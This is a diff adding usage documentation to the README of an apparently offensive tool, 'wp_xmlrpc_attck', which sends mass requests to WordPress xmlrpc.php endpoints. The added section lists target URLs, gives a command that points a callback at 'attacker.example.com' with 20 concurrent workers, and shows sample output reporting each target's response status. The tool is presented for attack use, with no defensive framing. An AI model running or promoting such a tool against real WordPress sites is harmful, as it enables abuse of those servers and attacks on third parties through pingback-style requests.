@@ -78,3 +78,25 @@ target/release/wp_xmlrpc_attck
 ```
 wp_xmlrpc_attck --list <FILE> --callback <CALLBACK> --source <SOURCE> [OPTIONS]
 ```
+## Target list (targets.txt)
+```
+https://example.com/xmlrpc.php
+https://wp.example.org/xmlrpc.php
+```
+### Command
+```
+wp_xmlrpc_attck \
+  --list targets.txt \
+  --callback attacker.example.com \
+  --source https://source.example.com \
+  --concurrency 20
+```
+## Output
+```
+[*] Loaded 2 targets.
+[*] Callback URL: attacker.example.com
+[*] Source URL:   https://source.example.com
+[https://example.com/xmlrpc.php] Status: 200 OK
+[https://wp.example.org/xmlrpc.php] Status: 403 Forbidden
+[+] All tests completed.
+```
